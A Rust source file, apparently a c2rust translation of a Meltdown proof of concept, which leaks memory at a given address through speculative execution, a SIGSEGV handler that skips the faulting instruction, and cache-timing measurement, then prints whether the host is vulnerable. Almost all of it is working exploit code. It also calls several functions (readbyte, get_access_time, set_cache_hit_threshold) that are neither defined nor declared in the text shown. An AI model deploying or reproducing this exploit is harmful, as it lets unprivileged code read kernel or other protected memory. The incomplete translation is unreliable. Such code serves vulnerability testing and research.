#![allow(dead_code, mutable_transmutes, non_camel_case_types, non_snake_case,
    non_upper_case_globals, unused_assignments, unused_mut)]
#![register_tool(c2rust)]
#![feature(asm, const_raw_ptr_to_usize_cast, main, register_tool, stdsimd)]
#[cfg(target_arch = "x86")]
pub use std::arch::x86::{_mm_mfence, _mm_clflush};
#[cfg(target_arch = "x86_64")]
pub use std::arch::x86_64::{_mm_mfence, _mm_clflush};
extern "C" {
#[no_mangle]
static mut stderr: *mut _IO_FILE;
#[no_mangle]
fn fprintf(_: *mut FILE, _: *const libc::c_char, _: ...) -> libc::c_int;
#[no_mangle]
fn printf(_: *const libc::c_char, _: ...) -> libc::c_int;
#[no_mangle]
fn sscanf(_: *const libc::c_char, _: *const libc::c_char, _: ...)
-> libc::c_int;
#[no_mangle]
fn perror(__s: *const libc::c_char);
#[no_mangle]
fn memset(_: *mut libc::c_void, _: libc::c_int, _: libc::c_ulong)
-> *mut libc::c_void;
#[no_mangle]
fn sigaction(__sig: libc::c_int, __act: *const sigaction,
            __oact: *mut sigaction) -> libc::c_int;
#[no_mangle]
fn close(__fd: libc::c_int) -> libc::c_int;
#[no_mangle]
fn pread(__fd: libc::c_int, __buf: *mut libc::c_void, __nbytes: size_t,
        __offset: __off_t) -> ssize_t;
#[no_mangle]
fn open(__file: *const libc::c_char, __oflag: libc::c_int, _: ...)
-> libc::c_int;
#[no_mangle]
fn __ctype_b_loc() -> *mut *const libc::c_ushort;
#[no_mangle]
fn sched_setaffinity(__pid: __pid_t, __cpusetsize: size_t,
                    __cpuset: *const cpu_set_t) -> libc::c_int;
#[no_mangle]
fn exit(_: libc::c_int) -> !;
#[no_mangle]
static mut stopspeculate: [libc::c_char; 0];
}
pub type size_t = libc::c_ulong;
pub type __uint16_t = libc::c_ushort;
pub type __uint32_t = libc::c_uint;
pub type __uint64_t = libc::c_ulong;
pub type __uid_t = libc::c_uint;
pub type __off_t = libc::c_long;
pub type __off64_t = libc::c_long;
pub type __pid_t = libc::c_int;
pub type __clock_t = libc::c_long;
pub type __ssize_t = libc::c_long;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct _IO_FILE {
pub _flags: libc::c_int,
pub _IO_read_ptr: *mut libc::c_char,
pub _IO_read_end: *mut libc::c_char,
pub _IO_read_base: *mut libc::c_char,
pub _IO_write_base: *mut libc::c_char,
pub _IO_write_ptr: *mut libc::c_char,
pub _IO_write_end: *mut libc::c_char,
pub _IO_buf_base: *mut libc::c_char,
pub _IO_buf_end: *mut libc::c_char,
pub _IO_save_base: *mut libc::c_char,
pub _IO_backup_base: *mut libc::c_char,
pub _IO_save_end: *mut libc::c_char,
pub _markers: *mut _IO_marker,
pub _chain: *mut _IO_FILE,
pub _fileno: libc::c_int,
pub _flags2: libc::c_int,
pub _old_offset: __off_t,
pub _cur_column: libc::c_ushort,
pub _vtable_offset: libc::c_schar,
pub _shortbuf: [libc::c_char; 1],
pub _lock: *mut libc::c_void,
pub _offset: __off64_t,
pub __pad1: *mut libc::c_void,
pub __pad2: *mut libc::c_void,
pub __pad3: *mut libc::c_void,
pub __pad4: *mut libc::c_void,
pub __pad5: size_t,
pub _mode: libc::c_int,
pub _unused2: [libc::c_char; 20],
}
pub type _IO_lock_t = ();
#[derive(Copy, Clone)]
#[repr(C)]
pub struct _IO_marker {
pub _next: *mut _IO_marker,
pub _sbuf: *mut _IO_FILE,
pub _pos: libc::c_int,
}
pub type FILE = _IO_FILE;
pub type ssize_t = __ssize_t;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct __sigset_t {
pub __val: [libc::c_ulong; 16],
}
#[derive(Copy, Clone)]
#[repr(C)]
pub union sigval {
pub sival_int: libc::c_int,
pub sival_ptr: *mut libc::c_void,
}
pub type sigval_t = sigval;
pub type __sigchld_clock_t = __clock_t;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct siginfo_t {
pub si_signo: libc::c_int,
pub si_errno: libc::c_int,
pub si_code: libc::c_int,
pub _sifields: C2RustUnnamed,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub union C2RustUnnamed {
pub _pad: [libc::c_int; 28],
pub _kill: C2RustUnnamed_7,
pub _timer: C2RustUnnamed_6,
pub _rt: C2RustUnnamed_5,
pub _sigchld: C2RustUnnamed_4,
pub _sigfault: C2RustUnnamed_2,
pub _sigpoll: C2RustUnnamed_1,
pub _sigsys: C2RustUnnamed_0,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct C2RustUnnamed_0 {
pub _call_addr: *mut libc::c_void,
pub _syscall: libc::c_int,
pub _arch: libc::c_uint,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct C2RustUnnamed_1 {
pub si_band: libc::c_long,
pub si_fd: libc::c_int,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct C2RustUnnamed_2 {
pub si_addr: *mut libc::c_void,
pub si_addr_lsb: libc::c_short,
pub si_addr_bnd: C2RustUnnamed_3,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct C2RustUnnamed_3 {
pub _lower: *mut libc::c_void,
pub _upper: *mut libc::c_void,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct C2RustUnnamed_4 {
pub si_pid: __pid_t,
pub si_uid: __uid_t,
pub si_status: libc::c_int,
pub si_utime: __sigchld_clock_t,
pub si_stime: __sigchld_clock_t,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct C2RustUnnamed_5 {
pub si_pid: __pid_t,
pub si_uid: __uid_t,
pub si_sigval: sigval_t,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct C2RustUnnamed_6 {
pub si_tid: libc::c_int,
pub si_overrun: libc::c_int,
pub si_sigval: sigval_t,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct C2RustUnnamed_7 {
pub si_pid: __pid_t,
pub si_uid: __uid_t,
}
pub type __sighandler_t = Option<unsafe extern "C" fn(_: libc::c_int) -> ()>;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct sigaction {
pub __sigaction_handler: C2RustUnnamed_8,
pub sa_mask: __sigset_t,
pub sa_flags: libc::c_int,
pub sa_restorer: Option<unsafe extern "C" fn() -> ()>,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub union C2RustUnnamed_8 {
pub sa_handler: __sighandler_t,
pub sa_sigaction: Option<unsafe extern "C" fn(_: libc::c_int,
                                             _: *mut siginfo_t,
                                             _: *mut libc::c_void)
                            -> ()>,
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct sigaltstack {
pub ss_sp: *mut libc::c_void,
pub ss_flags: libc::c_int,
pub ss_size: size_t,
}
pub type stack_t = sigaltstack;
pub type greg_t = libc::c_longlong;
pub type gregset_t = [greg_t; 23];
pub type C2RustUnnamed_9 = libc::c_uint;
pub const REG_CR2: C2RustUnnamed_9 = 22;
pub const REG_OLDMASK: C2RustUnnamed_9 = 21;
pub const REG_TRAPNO: C2RustUnnamed_9 = 20;
pub const REG_ERR: C2RustUnnamed_9 = 19;
pub const REG_CSGSFS: C2RustUnnamed_9 = 18;
pub const REG_EFL: C2RustUnnamed_9 = 17;
pub const REG_RIP: C2RustUnnamed_9 = 16;
pub const REG_RSP: C2RustUnnamed_9 = 15;
pub const REG_RCX: C2RustUnnamed_9 = 14;
pub const REG_RAX: C2RustUnnamed_9 = 13;
pub const REG_RDX: C2RustUnnamed_9 = 12;
pub const REG_RBX: C2RustUnnamed_9 = 11;
pub const REG_RBP: C2RustUnnamed_9 = 10;
pub const REG_RSI: C2RustUnnamed_9 = 9;
pub const REG_RDI: C2RustUnnamed_9 = 8;
pub const REG_R15: C2RustUnnamed_9 = 7;
pub const REG_R14: C2RustUnnamed_9 = 6;
pub const REG_R13: C2RustUnnamed_9 = 5;
pub const REG_R12: C2RustUnnamed_9 = 4;
pub const REG_R11: C2RustUnnamed_9 = 3;
pub const REG_R10: C2RustUnnamed_9 = 2;
pub const REG_R9: C2RustUnnamed_9 = 1;
pub const REG_R8: C2RustUnnamed_9 = 0;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct _libc_fpxreg {
pub significand: [libc::c_ushort; 4],
pub exponent: libc::c_ushort,
pub padding: [libc::c_ushort; 3],
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct _libc_xmmreg {
pub element: [__uint32_t; 4],
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct _libc_fpstate {
pub cwd: __uint16_t,
pub swd: __uint16_t,
pub ftw: __uint16_t,
pub fop: __uint16_t,
pub rip: __uint64_t,
pub rdp: __uint64_t,
pub mxcsr: __uint32_t,
pub mxcr_mask: __uint32_t,
pub _st: [_libc_fpxreg; 8],
pub _xmm: [_libc_xmmreg; 16],
pub padding: [__uint32_t; 24],
}
pub type fpregset_t = *mut _libc_fpstate;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct mcontext_t {
pub gregs: gregset_t,
pub fpregs: fpregset_t,
pub __reserved1: [libc::c_ulonglong; 8],
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct ucontext {
pub uc_flags: libc::c_ulong,
pub uc_link: *mut ucontext,
pub uc_stack: stack_t,
pub uc_mcontext: mcontext_t,
pub uc_sigmask: __sigset_t,
pub __fpregs_mem: _libc_fpstate,
}
pub type ucontext_t = ucontext;
pub type C2RustUnnamed_10 = libc::c_uint;
pub const _ISalnum: C2RustUnnamed_10 = 8;
pub const _ISpunct: C2RustUnnamed_10 = 4;
pub const _IScntrl: C2RustUnnamed_10 = 2;
pub const _ISblank: C2RustUnnamed_10 = 1;
pub const _ISgraph: C2RustUnnamed_10 = 32768;
pub const _ISprint: C2RustUnnamed_10 = 16384;
pub const _ISspace: C2RustUnnamed_10 = 8192;
pub const _ISxdigit: C2RustUnnamed_10 = 4096;
pub const _ISdigit: C2RustUnnamed_10 = 2048;
pub const _ISalpha: C2RustUnnamed_10 = 1024;
pub const _ISlower: C2RustUnnamed_10 = 512;
pub const _ISupper: C2RustUnnamed_10 = 256;
pub type __cpu_mask = libc::c_ulong;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct cpu_set_t {
pub __bits: [__cpu_mask; 16],
}
static mut target_array: [libc::c_char; 1048576] = [0; 1048576];
#[inline(never)]
unsafe extern "C" fn speculate(mut addr: libc::c_ulong) {
asm!("1:\n\t.rept 300\n\tadd $$0x141, %rax\n\t.endr\n\tmovzx ($1), %eax\n\tshl $$12, %rax\n\tjz 1b\n\tmovzx ($0, %rax, 1), %rbx\nstopspeculate: \n\tnop\n\t"
    : : "r" (target_array.as_mut_ptr()), "r" (addr) : "rax", "rbx" :
    "volatile");
/* ifdef __x86_64__ */
}
static mut cache_hit_threshold: libc::c_int = 0;
static mut hist: [libc::c_int; 256] = [0; 256];
#[no_mangle]
pub unsafe extern "C" fn check() {
let mut i: libc::c_int = 0;
let mut time: libc::c_int = 0;
let mut mix_i: libc::c_int = 0;
let mut addr: *mut libc::c_char = 0 as *mut libc::c_char;
i = 0 as libc::c_int;
while i < (1 as libc::c_int) << 8 as libc::c_int {
   mix_i =
       i * 167 as libc::c_int + 13 as libc::c_int & 255 as libc::c_int;
   addr =
       &mut *target_array.as_mut_ptr().offset((mix_i *
                                                   ((1 as libc::c_int) <<
                                                        12 as
                                                            libc::c_int))
                                                  as isize) as
           *mut libc::c_char as *mut libc::c_char;
   time = get_access_time(addr);
   if time <= cache_hit_threshold { hist[mix_i as usize] += 1 }
   i += 1
};
}
#[no_mangle]
pub unsafe extern "C" fn sigsegv(mut sig: libc::c_int,
                            mut siginfo: *mut siginfo_t,
                            mut context: *mut libc::c_void) {
let mut ucontext: *mut ucontext_t = context as *mut ucontext_t;
(*ucontext).uc_mcontext.gregs[REG_RIP as libc::c_int as usize] =
   stopspeculate.as_mut_ptr() as libc::c_ulong as greg_t;
}
#[no_mangle]
pub unsafe extern "C" fn set_signal() -> libc::c_int {
let mut act: sigaction =
   {
       let mut init =
           sigaction{__sigaction_handler:
                         C2RustUnnamed_8{sa_sigaction:
                                             Some(sigsegv as
                                                      unsafe extern "C" fn(_:
                                                                               libc::c_int,
                                                                           _:
                                                                               *mut siginfo_t,
                                                                           _:
                                                                               *mut libc::c_void)
                                                          -> ()),},
                     sa_mask: __sigset_t{__val: [0; 16],},
                     sa_flags: 4 as libc::c_int,
                     sa_restorer: None,};
       init
   };
return sigaction(11 as libc::c_int, &mut act, 0 as *mut sigaction);
}
static mut progname: *mut libc::c_char =
0 as *const libc::c_char as *mut libc::c_char;
#[no_mangle]
pub unsafe extern "C" fn usage() -> libc::c_int {
printf(b"%s: [hexaddr] [size]\n\x00" as *const u8 as *const libc::c_char,
      progname);
return 2 as libc::c_int;
}
unsafe extern "C" fn mysqrt(mut val: libc::c_long) -> libc::c_int {
let mut root: libc::c_int =
   (val / 2 as libc::c_int as libc::c_long) as libc::c_int;
let mut prevroot: libc::c_int = 0 as libc::c_int;
let mut i: libc::c_int = 0 as libc::c_int;
while prevroot != root &&
         { let fresh0 = i; i = i + 1; (fresh0) < 100 as libc::c_int } {
   prevroot = root;
   root =
       ((val / root as libc::c_long + root as libc::c_long) /
            2 as libc::c_int as libc::c_long) as libc::c_int
}
return root;
}
unsafe extern "C" fn min(mut a: libc::c_int, mut b: libc::c_int)
-> libc::c_int {
return if a < b { a } else { b };
}
unsafe extern "C" fn pin_cpu0() {
let mut mask: cpu_set_t = cpu_set_t{__bits: [0; 16],};
/* PIN to CPU0 */
libc::memset(&mut mask as *mut cpu_set_t as *mut libc::c_void,
            '\u{0}' as i32,
            ::std::mem::size_of::<cpu_set_t>() as libc::c_ulong as
                libc::size_t);
let mut __cpu: size_t = 0 as libc::c_int as size_t;
if __cpu.wrapping_div(8 as libc::c_int as libc::c_ulong) <
      ::std::mem::size_of::<cpu_set_t>() as libc::c_ulong {
   let ref mut fresh1 =
       *mask.__bits.as_mut_ptr().offset(__cpu.wrapping_div((8 as
                                                                libc::c_int
                                                                as
                                                                libc::c_ulong).wrapping_mul(::std::mem::size_of::<__cpu_mask>()
                                                                                                as
                                                                                                libc::c_ulong))
                                            as isize);
   *fresh1 |=
       (1 as libc::c_int as __cpu_mask) <<
           __cpu.wrapping_rem((8 as libc::c_int as
                                   libc::c_ulong).wrapping_mul(::std::mem::size_of::<__cpu_mask>()
                                                                   as
                                                                   libc::c_ulong))
} else { };
sched_setaffinity(0 as libc::c_int,
                 ::std::mem::size_of::<cpu_set_t>() as libc::c_ulong,
                 &mut mask);
}
unsafe fn main_0(mut argc: libc::c_int, mut argv: *mut *mut libc::c_char)
-> libc::c_int {
let mut ret: libc::c_int = 0;
let mut fd: libc::c_int = 0;
let mut i: libc::c_int = 0;
let mut score: libc::c_int = 0;
let mut is_vulnerable: libc::c_int = 0;
let mut addr: libc::c_ulong = 0;
let mut size: libc::c_ulong = 0;
static mut expected: [libc::c_char; 14] =
   [37, 115, 32, 118, 101, 114, 115, 105, 111, 110, 32, 37, 115, 0];
progname = *argv.offset(0 as libc::c_int as isize);
if argc < 3 as libc::c_int { return usage() }
if sscanf(*argv.offset(1 as libc::c_int as isize),
         b"%lx\x00" as *const u8 as *const libc::c_char,
         &mut addr as *mut libc::c_ulong) != 1 as libc::c_int {
   return usage()
}
if sscanf(*argv.offset(2 as libc::c_int as isize),
         b"%lx\x00" as *const u8 as *const libc::c_char,
         &mut size as *mut libc::c_ulong) != 1 as libc::c_int {
   return usage()
}
memset(target_array.as_mut_ptr() as *mut libc::c_void, 1 as libc::c_int,
      ::std::mem::size_of::<[libc::c_char; 1048576]>() as libc::c_ulong);
ret = set_signal();
pin_cpu0();
set_cache_hit_threshold();
fd =
   open(b"/proc/version\x00" as *const u8 as *const libc::c_char,
        0 as libc::c_int);
if fd < 0 as libc::c_int {
   perror(b"open\x00" as *const u8 as *const libc::c_char);
   return -(1 as libc::c_int)
}
score = 0 as libc::c_int;
i = 0 as libc::c_int;
while (i as libc::c_ulong) < size {
   ret = readbyte(fd, addr);
   if ret == -(1 as libc::c_int) { ret = 0xff as libc::c_int }
   printf(b"read %lx = %x %c (score=%d/%d)\n\x00" as *const u8 as
              *const libc::c_char, addr, ret,
          if *(*__ctype_b_loc()).offset(ret as isize) as libc::c_int &
                 _ISprint as libc::c_int as libc::c_ushort as libc::c_int
                 != 0 {
              ret
          } else { ' ' as i32 },
          if ret != 0xff as libc::c_int {
              hist[ret as usize]
          } else { 0 as libc::c_int }, 1000 as libc::c_int);
   if (i as libc::c_ulong) <
          ::std::mem::size_of::<[libc::c_char; 14]>() as libc::c_ulong &&
          ret == expected[i as usize] as libc::c_int {
       score += 1
   }
   addr = addr.wrapping_add(1);
   i += 1
}
close(fd);
is_vulnerable =
   (score >
        min(size as libc::c_int,
            ::std::mem::size_of::<[libc::c_char; 14]>() as libc::c_ulong
                as libc::c_int) / 2 as libc::c_int) as libc::c_int;
if is_vulnerable != 0 {
   fprintf(stderr,
           b"VULNERABLE\n\x00" as *const u8 as *const libc::c_char);
} else {
   fprintf(stderr,
           b"NOT VULNERABLE\n\x00" as *const u8 as *const libc::c_char);
}
exit(is_vulnerable);
}
#[main]
pub fn main() {
let mut args: Vec<*mut libc::c_char> = Vec::new();
for arg in ::std::env::args() {
   args.push(::std::ffi::CString::new(arg).expect("Failed to convert argument into CString.").into_raw());
};
args.push(::std::ptr::null_mut());
unsafe {
   ::std::process::exit(main_0((args.len() - 1) as libc::c_int,
                               args.as_mut_ptr() as
                                   *mut *mut libc::c_char) as i32)
}
}
